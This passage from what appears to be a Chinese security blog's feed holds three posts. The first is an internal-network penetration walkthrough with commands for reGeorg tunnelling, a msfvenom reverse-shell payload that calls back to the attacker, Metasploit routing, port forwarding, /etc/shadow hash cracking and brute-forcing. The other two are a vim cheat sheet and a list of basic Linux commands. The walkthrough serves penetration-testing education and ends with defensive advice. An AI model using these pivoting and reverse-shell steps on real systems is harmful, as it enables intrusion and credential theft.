<h5 id="http代理转发"><a href="#http代理转发" class="headerlink" title="http代理转发"></a>http代理转发</h5><p>如果目标服务器有web系统，可以使用Regeorg + proxychains。<br>工具下载：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">reGeorg</a>、<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">proxychains</a><br>将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 2333 -u http://test.com/tunnel.php</div></pre></td></tr></table></figure></p>
<p>然后修改proxychains.conf 配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/proxychains.conf   （mac上在~/.proxychains/proxychains.conf ,没有则自己创建）</div></pre></td></tr></table></figure></p>
<p>在最后一行添加socks5 127.0.0.1 2333(与regeorg设置的端口相同)</p>
<p>最后在攻击机使用扫描工具时，可以在执行的命令前加proxhchains4, 比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains4 nmap -sT -Pn -n 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）.</p>
<h5 id="tcp代理转发"><a href="#tcp代理转发" class="headerlink" title="tcp代理转发"></a>tcp代理转发</h5><p>思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。</p>
<h6 id="生成msf木马"><a href="#生成msf木马" class="headerlink" title="生成msf木马"></a>生成msf木马</h6><p>生成木马：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf &gt; shell_8000.elf</div></pre></td></tr></table></figure></p>
<p>由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。</p>
<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><p>　　攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。<br>　　此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。</p>
<h6 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h6><p>上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。<br>查看下肉鸡的网络情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run get_local_subnets</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170809/1.png" alt=""><br>添加路由:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute -s 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>查看路由：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute –p</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170809/2.png" alt=""><br>一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。<br>查看路由：<br><img src="/upload_image/20170809/3.png" alt=""><br>这里已经是添加好的结果，添加路由命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; route add 192.168.16.0 255.255.255.0 12</div><div class="line">msf exploit(handler) &gt; route add 192.168.17.0 255.255.255.0 12</div></pre></td></tr></table></figure></p>
<p>注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。</p>
<p>说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<p>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">攻击机&lt;--&gt;meterpreter_shell（session）&lt;--&gt;肉鸡 <span class="comment"># 这里不是端口的概念，而是路由</span></div></pre></td></tr></table></figure></p>
<h5 id="tcp全局代理转发"><a href="#tcp全局代理转发" class="headerlink" title="tcp全局代理转发"></a>tcp全局代理转发</h5><p>　　通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains ，使用方法跟http代理类似。</p>
<p>注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter shell。</p>
<p>metasploit操作可参考：<a href="https://thief.one/2017/08/01/1/">【渗透神器系列】Metasploit</a></p>
<h4 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h4><p>推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。<br>扫描模块：</p>
<ul>
<li>auxiliary/scanner/portscan　　端口扫描</li>
<li>scanner/portscan/syn　　SYN端口扫描</li>
<li>scanner/portscan/tcp　　TCP端口扫描<br>……</li>
</ul>
<p>除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。</p>
<h3 id="针对22端口的入侵"><a href="#针对22端口的入侵" class="headerlink" title="针对22端口的入侵"></a>针对22端口的入侵</h3><p>　　扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。</p>
<h4 id="尝试hash破解"><a href="#尝试hash破解" class="headerlink" title="尝试hash破解"></a>尝试hash破解</h4><p>如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。</p>
<ul>
<li><a href="http://www.openwall.com/john/" target="_blank" rel="external">John破解hash</a></li>
<li><a href="https://github.com/hashcat/hashcat" target="_blank" rel="external">Hashcat</a></li>
</ul>
<p>注：windows下可以使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">mimikatz</a></p>
<p>说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器。</p>
<h4 id="字典暴力破解"><a href="#字典暴力破解" class="headerlink" title="字典暴力破解"></a>字典暴力破解</h4><p>这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。<br>工具：</p>
<ul>
<li>hydra</li>
<li>msf上的相应模块</li>
</ul>
<h3 id="针对其他端口的入侵"><a href="#针对其他端口的入侵" class="headerlink" title="针对其他端口的入侵"></a>针对其他端口的入侵</h3><p>　　除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。</p>
<h3 id="针对web服务的入侵"><a href="#针对web服务的入侵" class="headerlink" title="针对web服务的入侵"></a>针对web服务的入侵</h3><p>　　除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。</p>
<h3 id="端口转发的逆袭"><a href="#端口转发的逆袭" class="headerlink" title="端口转发的逆袭"></a>端口转发的逆袭</h3><p>　　前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？<br>　　事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。</p>
<h4 id="meterpreter实现端口转发"><a href="#meterpreter实现端口转发" class="headerlink" title="meterpreter实现端口转发"></a>meterpreter实现端口转发</h4><p>在meterpreter shell中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; portfwd add -l 55555 -r 192.168.16.1 -p 3306</div></pre></td></tr></table></figure></p>
<p>说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。<br>发现攻击机上监听了2222端口，连接到了本机其外一个高端口。<br><img src="/upload_image/20170809/4.png" alt=""><br>肉鸡的22端口也连接到了肉鸡自己的一个高端口<br><img src="/upload_image/20170809/5.png" alt=""><br>那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。</p>
<h4 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h4><p>攻击机:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -listen 2222 3333 <span class="comment"># 2222为转发端口，3333为本机任意未被占用的端口</span></div></pre></td></tr></table></figure></p>
<p>肉鸡：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -slave 110.1.1.1 2222 127.0.0.1 3389</div></pre></td></tr></table></figure></p>
<p>110.1.1.1为攻击机外网ip，2222为转发端口，127.0.0.1为肉鸡内网ip，3389为远程终端端口 。</p>
<h3 id="内网嗅探"><a href="#内网嗅探" class="headerlink" title="内网嗅探"></a>内网嗅探</h3><p>　　windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。</p>
<h3 id="linux内网安全建议"><a href="#linux内网安全建议" class="headerlink" title="linux内网安全建议"></a>linux内网安全建议</h3><p>说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法，可以一起留言讨论。</p>
<ul>
<li>每台服务器上安装监控软件，监控并拦截木马程序的运行（监控木马文件以及行为）</li>
<li>监控服务器上开启的新端口，查看其连接情况，是否有异常连接（监控异常端口）</li>
<li>服务器及时更新补丁，以及最新系统漏洞补丁（减少漏洞）</li>
<li>服务器上运行的应用给予低权限（增加提权的难度）</li>
<li>不必要连接外网的服务器，禁止连接外网（减少被入侵的风险）</li>
<li>日志记录并且实时监控（监控异常操作以及暴力破解行为）</li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://bobao.360.cn/learning/detail/4164.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4164.html</a><br><a href="http://bobao.360.cn/learning/detail/3204.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3204.html</a><br><a href="http://www.freebuf.com/sectool/56432.html" target="_blank" rel="external">http://www.freebuf.com/sectool/56432.html</a><br><a href="http://www.freebuf.com/articles/network/125278.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/125278.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Nothing great was ever achieved without enthusiasm&lt;br&gt;无热情成就不了伟业&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="内网渗透" scheme="http://thief.one/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】Vim使用</title>
    <link href="http://thief.one/2017/08/09/1/"/>
    <id>http://thief.one/2017/08/09/1/</id>
    <published>2017-08-09T07:53:58.000Z</published>
    <updated>2017-08-11T04:04:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">The secret of success is constancy of purpose<br>成功的秘诀在于持之于恒<br></blockquote><br>　　工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。<br><a id="more"></a><br><img src="/upload_image/20170809/6.png" alt=""></p>
<h3 id="复制剪切粘贴"><a href="#复制剪切粘贴" class="headerlink" title="复制剪切粘贴"></a>复制剪切粘贴</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yy  <span class="comment"># 复制一行</span></div><div class="line">dd  <span class="comment"># 剪切一行</span></div><div class="line">p   <span class="comment"># 粘贴</span></div></pre></td></tr></table></figure>
<h3 id="查找单词"><a href="#查找单词" class="headerlink" title="查找单词"></a>查找单词</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:/nmask <span class="comment"># 查找存在nmask字符串的位置</span></div><div class="line">或者</div><div class="line">bin/bash&gt;:?nmask <span class="comment"># 查找存在nmask字符串的位置</span></div></pre></td></tr></table></figure>
<p>继续查找下一个存在nmask字符串的位置</p>
<ul>
<li>n 往上查找</li>
<li>N 往下查找</li>
</ul>
<h3 id="编辑器显示设置"><a href="#编辑器显示设置" class="headerlink" title="编辑器显示设置"></a>编辑器显示设置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">:<span class="built_in">set</span> nu!        <span class="comment"># 显示行号</span></div><div class="line">:<span class="built_in">set</span> autoindent <span class="comment"># 自动缩进</span></div><div class="line">:syntax <span class="built_in">enable</span>  <span class="comment"># 语法高亮</span></div></pre></td></tr></table></figure>
<h3 id="文件内容定位"><a href="#文件内容定位" class="headerlink" title="文件内容定位"></a>文件内容定位</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gg              <span class="comment"># 首行</span></div><div class="line">G               <span class="comment"># 末行</span></div><div class="line">XG              <span class="comment"># 定位到第X行</span></div><div class="line">或者：</div><div class="line">bin/bash&gt;：10   <span class="comment"># 定位到第10行</span></div></pre></td></tr></table></figure>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">o <span class="comment"># 在当前行下插入一行</span></div></pre></td></tr></table></figure>
<h3 id="保存退出"><a href="#保存退出" class="headerlink" title="保存退出"></a>保存退出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ZZ <span class="comment"># 保存退出</span></div><div class="line">ZQ <span class="comment"># 不保存退出</span></div><div class="line">bin/bash&gt;：w　filename   <span class="comment"># 另存为</span></div></pre></td></tr></table></figure>
<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:％s/regexp/replacement/g   <span class="comment"># 文本中所有匹配的都替换</span></div></pre></td></tr></table></figure>
<h3 id="行内移动"><a href="#行内移动" class="headerlink" title="行内移动"></a>行内移动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">（  <span class="comment"># 移动到句首</span></div><div class="line">）  <span class="comment"># 移动到句尾</span></div></pre></td></tr></table></figure>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a><br><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;The secret of success is constancy of purpose&lt;br&gt;成功的秘诀在于持之于恒&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="vim" scheme="http://thief.one/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>【玩转Linux系列】Linux基础命令</title>
    <link href="http://thief.one/2017/08/08/1/"/>
    <id>http://thief.one/2017/08/08/1/</id>
    <published>2017-08-08T12:21:20.000Z</published>
    <updated>2017-08-11T04:04:59.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">即使跌倒了，你要懂得抓一把沙子在手里。<br></blockquote><br>　　随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。<br><a id="more"></a></p>
<h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><h4 id="解析命令的意思-whatis、info"><a href="#解析命令的意思-whatis、info" class="headerlink" title="解析命令的意思(whatis、info)"></a>解析命令的意思(whatis、info)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">whatis whoami 解析命令的意思</div><div class="line">info whoami   详细解析命令的意思</div></pre></td></tr></table></figure>
<h4 id="寻找命令的安装路径-which、whereis"><a href="#寻找命令的安装路径-which、whereis" class="headerlink" title="寻找命令的安装路径(which、whereis)"></a>寻找命令的安装路径(which、whereis)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> whoami  寻找命令的位置</div><div class="line">whereis whoami 寻找程序的位置</div></pre></td></tr></table></figure>
<h3 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h3><h4 id="目录查看-ls"><a href="#目录查看-ls" class="headerlink" title="目录查看(ls)"></a>目录查看(ls)</h4><p>查看目录结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tree</div></pre></td></tr></table></figure></p>
<p>查看当前目录下所有子文件夹排序后的大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh `ls` | sort</div></pre></td></tr></table></figure></p>
<p>查看目录下文件个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ./ | wc -l</div></pre></td></tr></table></figure></p>
<p>按时间排序，以列表的方式显示目录项<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -lrt</div></pre></td></tr></table></figure></p>
<p>给每项文件前面增加一个id编号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls | cat -n</div></pre></td></tr></table></figure></p>
<h4 id="文件目录权限-chmod、chown"><a href="#文件目录权限-chmod、chown" class="headerlink" title="文件目录权限(chmod、chown)"></a>文件目录权限(chmod、chown)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">改变文件的拥有者 chown</div><div class="line">改变文件读、写、执行等属性 chmod</div><div class="line">递归子目录修改： chown -R tuxapp <span class="built_in">source</span>/</div><div class="line">增加脚本可执行权限： chmod a+x myscript</div></pre></td></tr></table></figure>
<h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="文件创建删除-touch、echo、rm-f"><a href="#文件创建删除-touch、echo、rm-f" class="headerlink" title="文件创建删除(touch、echo、rm -f)"></a>文件创建删除(touch、echo、rm -f)</h4><p>删除日志文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm *<span class="built_in">log</span> (等价: <span class="variable">$find</span> ./ -name “*<span class="built_in">log</span>” -<span class="built_in">exec</span> rm &#123;&#125; ;)</div></pre></td></tr></table></figure></p>
<h4 id="文件查看-du-sh"><a href="#文件查看-du-sh" class="headerlink" title="文件查看(du -sh)"></a>文件查看(du -sh)</h4><p>查看文件大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh  文件名</div></pre></td></tr></table></figure></p>
<p>统计文件行数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wc -l test.txt</div></pre></td></tr></table></figure></p>
<h4 id="文件内容查看-cat、head、tail"><a href="#文件内容查看-cat、head、tail" class="headerlink" title="文件内容查看(cat、head、tail)"></a>文件内容查看(cat、head、tail)</h4><p>显示时同时显示行号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat -n  （如：cat test.txt | cat -n）</div></pre></td></tr></table></figure></p>
<p>正向逆向查看文件内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">head -1 filename <span class="comment"># 第1行内容</span></div><div class="line">tail -5 filename <span class="comment"># 倒数5行内容</span></div></pre></td></tr></table></figure></p>
<h4 id="文件搜索-find"><a href="#文件搜索-find" class="headerlink" title="文件搜索(find)"></a>文件搜索(find)</h4><p>linux 复制特定后缀文件（保持目录结构）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar cvf my_txt_files.tar `find . -<span class="built_in">type</span> f -name <span class="string">"*.jsp*"</span>`</div></pre></td></tr></table></figure></p>
<p>递归当前目录及子目录并删除所有.log文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ./ -name <span class="string">"*.log"</span> -<span class="built_in">exec</span> rm &#123;&#125; \;</div></pre></td></tr></table></figure></p>
<p>否定参数查找所有非txt文本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . ! -name <span class="string">"*.txt"</span> -<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<p>按类型搜索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -<span class="built_in">type</span> d -<span class="built_in">print</span>  //只列出所有目录</div></pre></td></tr></table></figure></p>
<p>最近7天内被访问过的所有文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -atime -7 -<span class="built_in">type</span> f -<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<h4 id="文件内容搜索-grep"><a href="#文件内容搜索-grep" class="headerlink" title="文件内容搜索(grep)"></a>文件内容搜索(grep)</h4><p>查看成功登陆ssh的IP地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">centos</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/secure* | grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  -s --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div><div class="line"></div><div class="line">ubuntu：</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/auth.log* |grep <span class="string">'Accepted'</span> |grep ftp| grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  -s --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>递归目录搜索返回文本内容存在class字符串的行号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep <span class="string">"class"</span> . -R -n</div></pre></td></tr></table></figure></p>
<p>非匹配(-v)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep -v <span class="string">"python"</span>  <span class="comment">#匹配除了python进程</span></div></pre></td></tr></table></figure></p>
<h4 id="文件内容排序-sort"><a href="#文件内容排序-sort" class="headerlink" title="文件内容排序(sort)"></a>文件内容排序(sort)</h4><ul>
<li>-n 按数字进行排序 VS -d 按字典序进行排序</li>
<li>-r 逆序排序</li>
<li>-k N 指定按第N列排序</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sort -nrk 1 data.txt</div><div class="line">sort -bd data // 忽略像空格之类的前导空白字符</div></pre></td></tr></table></figure>
<h4 id="消除重复行-uniq"><a href="#消除重复行-uniq" class="headerlink" title="消除重复行(uniq)"></a>消除重复行(uniq)</h4><p>消除重复行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq</div></pre></td></tr></table></figure></p>
<p>统计各行在文件中出现的次数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq -c</div></pre></td></tr></table></figure></p>
<p>找出重复行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq -d</div></pre></td></tr></table></figure></p>
<h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><p>查看磁盘空间利用大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">df -h</div></pre></td></tr></table></figure></p>
